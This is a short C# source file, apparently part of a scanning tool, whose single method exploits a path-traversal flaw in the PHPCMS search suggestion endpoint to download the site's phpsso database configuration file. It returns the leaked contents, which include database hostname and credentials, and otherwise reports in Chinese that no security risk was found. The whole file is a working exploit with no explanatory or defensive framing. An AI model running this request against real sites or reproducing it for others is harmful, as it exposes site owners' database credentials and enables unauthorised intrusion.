using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class phpcms
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string exp = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php";
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string shuju = new WebClient
				{
					Encoding = Encoding.Default
				}.DownloadString(urls + exp);
				if (shuju.Contains("hostname"))
				{
					result = shuju;
				}
				else
				{
					result = "网站未发现安全隐患";
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
